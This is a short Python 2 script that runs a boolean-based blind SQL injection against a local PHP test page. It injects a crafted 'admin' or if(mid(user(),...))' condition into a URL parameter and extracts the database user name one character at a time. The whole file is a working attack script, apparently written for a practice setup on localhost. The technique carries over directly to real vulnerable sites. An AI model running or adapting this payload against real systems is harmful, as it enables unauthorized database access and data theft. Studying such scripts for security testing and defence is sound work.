import requests
payload ='qwertyuiopasdfghjklzxcvbnm@'
data=''
for i in range(1,15):
	for p in payload:
		url="http://localhost:9096/test/test1.php?x=admin' or if(mid(user(),%d,1)='%s',1,0)%s" %(i,p,'%23')
		result=requests.get(url)
		if result.text=='1':
			data+=p
			print data+'.'*i 
			break
print 'user :'+data
